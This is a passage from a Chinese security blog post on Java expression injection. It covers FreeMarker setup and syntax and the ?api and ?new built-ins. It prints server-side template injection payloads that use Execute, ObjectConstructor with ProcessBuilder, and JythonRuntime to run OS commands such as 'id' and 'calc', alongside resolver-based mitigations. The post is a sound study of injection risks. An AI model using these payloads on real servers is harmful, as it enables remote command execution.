class="line">getContextBean:113, ElementHandler (com.sun.beans.decoder)</span><br><span class="line">getContextBean:111, NewElementHandler (com.sun.beans.decoder)</span><br><span class="line">getValueObject:146, ObjectElementHandler (com.sun.beans.decoder)</span><br><span class="line">getValueObject:123, NewElementHandler (com.sun.beans.decoder)</span><br><span class="line">endElement:169, ElementHandler (com.sun.beans.decoder)</span><br><span class="line">endElement:321, DocumentHandler (com.sun.beans.decoder)</span><br><span class="line">endElement:1228, SynthParser (javax.swing.plaf.synth)</span><br><span class="line">endElement:618, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">scanEndElement:1728, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:2899, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:605, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDocument:542, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:889, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:825, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:141, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:1224, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:637, SAXParserImpl$JAXPSAXParser (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:326, SAXParserImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:197, SAXParser (javax.xml.parsers)</span><br><span class="line">parse:242, SynthParser (javax.swing.plaf.synth)</span><br><span class="line">load:649, SynthLookAndFeel (javax.swing.plaf.synth)</span><br></pre></td></tr></table></figure></div>

<h1 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h1><p><a class="link"   target="_blank" rel="noopener" href="https://freemarker.apache.org/" >FreeMarker<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 是 Java 里的<strong>模板引擎</strong>（Apache 2.0 开源）。它把“模板文件（.ftl&#x2F;.ftlh）”和“数据模型（Java 对象&#x2F;Map）”合成各种文本输出：最常见是 HTML 页面，也能生成邮件正文、配置文件、甚至源码片段。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/02/Java%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/images/freemarker_diagram.svg"
                      alt="freemarker_diagram"
                ></p>
<p>FreeMarker 的 3 个<strong>核心概念</strong>：</p>
<ul>
<li><strong>模板（Template）</strong>：已经解析好的 FTL 模板对象，可<strong>多次、并发复用</strong>来渲染输出。</li>
<li><strong>数据模型（Data-Model）</strong>：通常是 <code>Map/List/POJO</code> 的包装，FreeMarker 通过 <em>ObjectWrapper</em> 将 Java 对象映射为模板可用的类型（字符串&#x2F;数值&#x2F;布尔&#x2F;序列&#x2F;哈希&#x2F;时间等）。</li>
<li><strong>配置（Configuration）</strong>：模板加载、编码、输出格式、自动转义、版本兼容（<code>incompatible_improvements</code>）等都在此设置。</li>
</ul>
<h2 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="环境基础"><a href="#环境基础" class="headerlink" title="环境基础"></a>环境基础</h3><p>FreeMarker 可以通过如下 Maven 坐标引入：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.freemarker<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.34<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>然后通过下面这段代码进行一些基本配置和使用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 必要的导入（也可用通配：import freemarker.template.*;）</span></span><br><span class="line"><span class="keyword">import</span> freemarker.template.Configuration;</span><br><span class="line"><span class="keyword">import</span> freemarker.template.Template;</span><br><span class="line"><span class="keyword">import</span> freemarker.template.TemplateExceptionHandler;</span><br><span class="line"><span class="keyword">import</span> freemarker.core.HTMLOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">// —— 下面是最小示例 ——</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1) 创建全局配置对象；用常量锁定兼容行为到 2.3.34（不同版本细节可能有差异）</span></span><br><span class="line"><span class="type">Configuration</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>(Configuration.VERSION_2_3_34);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2) 告诉 FreeMarker 去哪里找模板：从 classpath 的 /templates 目录加载</span></span><br><span class="line"><span class="comment">//    等价写法也常见：(&quot;templates&quot;)；关键是你的模板打包后位于 classpath:/templates/</span></span><br><span class="line">cfg.setClassLoaderForTemplateLoading(getClass().getClassLoader(), <span class="string">&quot;/templates&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3) 统一编码，避免中文或符号乱码</span></span><br><span class="line">cfg.setDefaultEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) 模板出错时抛异常（开发期推荐）；其他可选：IGNORE_HANDLER / DEBUG_HANDLER（不推荐生产）</span></span><br><span class="line">cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5) 指定输出为 HTML，从而启用对应自动转义规则（更安全）</span></span><br><span class="line"><span class="comment">//    也可以在模板首行写 &lt;#ftl auto_esc=true&gt; 或直接使用 .ftlh 后缀达到类似效果</span></span><br><span class="line">cfg.setOutputFormat(HTMLOutputFormat.INSTANCE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6) 获取已解析的模板对象（推荐 .ftlh：HTML 模式、默认自动转义）</span></span><br><span class="line"><span class="type">Template</span> <span class="variable">tpl</span> <span class="operator">=</span> cfg.getTemplate(<span class="string">&quot;hello.ftlh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7) 准备数据模型；模板中可用 $&#123;user&#125; 访问</span></span><br><span class="line"><span class="comment">//    注意：Map.of 需要 JDK 9+；JDK 8 可改为 new HashMap&lt;&gt;() 然后 put</span></span><br><span class="line">Map&lt;String, Object&gt; data = Map.of(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8) 渲染到字符串（也可以传 OutputStreamWriter 写文件/HTTP 响应）</span></span><br><span class="line"><span class="comment">//    StringWriter 关闭无影响，这里不必 try-with-resources</span></span><br><span class="line"><span class="type">StringWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">tpl.process(data, out);          <span class="comment">// 可能抛 IOException / TemplateException</span></span><br><span class="line"><span class="type">String</span> <span class="variable">html</span> <span class="operator">=</span> out.toString();    <span class="comment">// 渲染结果</span></span><br></pre></td></tr></table></figure></div>

<p>FreeMarker 是 Spring Boot <strong>官方内置自动配置</strong>支持的模板引擎之一（与 Thymeleaf、Groovy&#x2F;Mustache 等并列）。</p>
<p>下面 maven 坐标对应的 FreeMarker 版本为 2.3.32：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="基本语法-2"><a href="#基本语法-2" class="headerlink" title="基本语法"></a>基本语法</h3><h4 id="插值（Interpolations）"><a href="#插值（Interpolations）" class="headerlink" title="插值（Interpolations）"></a>插值（Interpolations）</h4><p>这里的“<strong>插值</strong>”（Interpolation）指的是：<strong>把一个表达式的值“插”进模板输出</strong>。在 FreeMarker（FTL）里，就是把数据模型里的变量&#x2F;表达式结果渲染成文本。</p>
<ul>
<li><strong>标准插值</strong>：<code>$&#123;expression&#125;</code>，将表达式的值转为文本插入输出。</li>
<li><strong>数值插值</strong>：<code>#&#123;expression&#125;</code> —— <strong>仅用于数值</strong>的插值写法；已被官方<strong>标记为过时&#x2F;不推荐</strong>，一般改用 <code>$&#123;n?c&#125;</code>（canonical，机器可读）或配置 <code>number_format</code>。</li>
<li><strong>方括号插值（可选）</strong>：<code>[=expression]</code>，仅在启用“方括号标签语法”（2.3.28+）时可用，等价 <code>$&#123;…&#125;</code>，很少需要。</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;#-- hello.ftlh --&gt;</span><br><span class="line">&lt;#ftl output_format=&quot;HTML&quot; auto_esc=true&gt;</span><br><span class="line">&lt;h1&gt;Hello, $&#123;user!&quot;Guest&quot;&#125;!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;ID(machine): $&#123;id?c&#125;&lt;/p&gt; &lt;#-- 机器可读数值，避免 3,000,000 这种本地化格式 --&gt;</span><br></pre></td></tr></table></figure></div>

<h4 id="常用指令（FTL-标签）"><a href="#常用指令（FTL-标签）" class="headerlink" title="常用指令（FTL 标签）"></a>常用指令（FTL 标签）</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;#if cond&gt; ... &lt;#elseif other&gt; ... &lt;#else&gt; ... &lt;/#if&gt;</span><br><span class="line"></span><br><span class="line">&lt;#list users as u&gt;</span><br><span class="line">  $&#123;u.name&#125; - $&#123;u.age&#125;</span><br><span class="line">&lt;/#list&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign siteName = &quot;Docs&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;#include &quot;/partials/footer.ftlh&quot;&gt;  &lt;#-- 路径会被规范化到模板根 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;#-- 注释：不会出现在输出里 --&gt;</span><br></pre></td></tr></table></figure></div>

<p>再加上宏&#x2F;函数与命名空间：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;#macro badge type text&gt;</span><br><span class="line">  &lt;span class=&quot;badge $&#123;type&#125;&quot;&gt;$&#123;text&#125;&lt;/span&gt;</span><br><span class="line">&lt;/#macro&gt;</span><br><span class="line"></span><br><span class="line">&lt;@badge type=&quot;primary&quot; text=&quot;New&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;#function fullName u&gt;</span><br><span class="line">  &lt;#return u.first + &quot; &quot; + u.last&gt;</span><br><span class="line">&lt;/#function&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><h4 id="api：把模板变量“切换成-Java-视角”"><a href="#api：把模板变量“切换成-Java-视角”" class="headerlink" title="?api：把模板变量“切换成 Java 视角”"></a><code>?api</code>：把模板变量“切换成 Java 视角”</h4><p>把模板里的值切到“Java 视角”，从而 <strong>在模板中调用 Java 方法&#x2F;属性</strong>：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;obj?api.someJavaMethod()&#125;</span><br><span class="line">$&#123;obj?api.someBeanProperty&#125;</span><br></pre></td></tr></table></figure></div>

<p>FreeMarker 2.3.22 开始支持，需要通过 <code>Configurable.setAPIBuiltinEnabled(true)</code> 或设置 <code>api_builtin_enabled</code>（默认为false）</p>
<p>并不是所有值都支持<code>?api</code>，自定义的 <code>TemplateModel</code>(实现了 <code>freemarker.template.TemplateModelWithAPISupport</code> 接口)可以支持 <code>?api</code>。</p>
<p>可以通过 <code>value?has_api</code> 来检测一个值是否支持 <code>?api</code>。</p>
<p>此外，<code>freemarker.ext.beans</code> 下有一个配置文件<code>unsafeMethods.properties</code>，限制了一些常见敏感方法的调用。</p>
<p>2.3.30 加入 <code>java.security.ProtectionDomain.getClassLoader()</code>。</p>
<h4 id="new：在模板里“按类名反射实例化”"><a href="#new：在模板里“按类名反射实例化”" class="headerlink" title="?new：在模板里“按类名反射实例化”"></a><code>?new</code>：在模板里“按类名反射实例化”</h4><p>按类名 <strong>在模板里反射创建对象</strong>（返回的对象需是 FreeMarker 可调用的 <code>TemplateModel</code>，常见如 <code>TemplateMethodModelEx</code> &#x2F; <code>TemplateDirectiveModel</code>）：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;</span><br><span class="line">$&#123;ex(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure></div>

<p>用于实例化一个实现了<code>freemarker.template.TemplateMethodModel</code>接口的类，调用其构造器并返回一个变量。</p>
<p>2.3.17开始，可以通过<code>Configuration.setNewBuiltinClassResolver(TemplateClassResolver.XXX)</code> 或设置 <code>new_builtin_class_resolver</code> 来限制这个内建函数对类的访问，官方提供了三个预定义的类解析器（<code>TemplateClassResolver</code>接口下有）</p>
<ul>
<li><strong>UNRESTRICTED_RESOLVER</strong>：简单地调用<code>ClassUtil.forName(String)</code>。</li>
<li><strong>SAFER_RESOLVER</strong>：和第一个类似，但禁止解析<code>ObjectConstructor</code>，<code>Execute</code>和<code>JythonRuntime</code>。</li>
<li><strong>ALLOWS_NOTHING_RESOLVER</strong>：禁止解析任何类。</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;</span><br><span class="line">$&#123;ex(&quot;calc&quot;)&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign con=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;</span><br><span class="line">$&#123;con(&quot;java.lang.ProcessBuilder&quot;,&quot;calc&quot;).start()&#125;</span><br><span class="line"></span><br><span class="line">&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;</span><br><span class="line">&lt;@value&gt;import os;os.system(&quot;calc&quot;)&lt;/@value&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>freemarker.template.utility.JythonRuntime</code> 能够执行python代码，默认没有jython依赖，需要引入</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.python<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jython<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h1><h1 id="Enjoy"><a href="#Enjoy" class="headerlink" title="Enjoy"></a>Enjoy</h1><h1 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h1>
		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java 表达式注入</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-10-02 14:39:01</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-10-21 23:04:07
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/10/02/Java 表达式注入/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/10/02/Java%20%E5%86%85%E5%AD%98%E9%A9%AC/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java 内存马</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/09/09/Java%20FastJson/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java FastJson</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java 表达式注入</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#EL"><span class="nav-text">EL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="nav-text">基本语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%AF%B9%E8%B1%A1"><span class="nav-text">内置对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF"><span class="nav-text">漏洞场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%89%B9%E6%80%A7"><span class="nav-text">表达式特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1"><span class="nav-text">获取对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C"><span class="nav-text">动态执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C"><span class="nav-text">多语句执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90"><span class="nav-text">代码执行分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%A7%A3%E6%9E%90"><span class="nav-text">表达式解析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PageContextImpl-proprietaryEvaluate"><span class="nav-text">PageContextImpl#proprietaryEvaluate</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ValueExpressionImpl-getValue"><span class="nav-text">ValueExpressionImpl#getValue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%88AstValue%EF%BC%89"><span class="nav-text">方法调用（AstValue）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#AstValue-getValue"><span class="nav-text">AstValue#getValue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JasperELResolver-invoke"><span class="nav-text">JasperELResolver#invoke</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BeanELResolver-invoke"><span class="nav-text">BeanELResolver#invoke</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE%EF%BC%88AstAssign%EF%BC%89"><span class="nav-text">属性访问（AstAssign）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BeanELResolver-getValue"><span class="nav-text">BeanELResolver#getValue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BeanELResolver-setValue"><span class="nav-text">BeanELResolver#setValue</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="nav-text">利用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%8B%AC%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-text">方括号执行函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getter-setter-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="nav-text">getter&#x2F;setter 函数调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%87%E7%AD%BE%E4%B8%AD%E7%9A%84EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">标签中的EL表达式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E5%90%88-JS-%E5%BC%95%E6%93%8E"><span class="nav-text">结合 JS 引擎</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SpEL"><span class="nav-text">SpEL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-1"><span class="nav-text">基本概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95-1"><span class="nav-text">基本语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF-1"><span class="nav-text">漏洞场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7-1"><span class="nav-text">利用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8"><span class="nav-text">基础利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E5%90%88-JS-%E5%BC%95%E6%93%8E-1"><span class="nav-text">结合 JS 引擎</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%94%BB%E5%87%BB"><span class="nav-text">类加载攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#UrlClassloader"><span class="nav-text">UrlClassloader</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ReflectUtils"><span class="nav-text">ReflectUtils</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD-xml"><span class="nav-text">远程加载 xml</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FreeMarker"><span class="nav-text">FreeMarker</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-2"><span class="nav-text">基本概念</span></a><ol 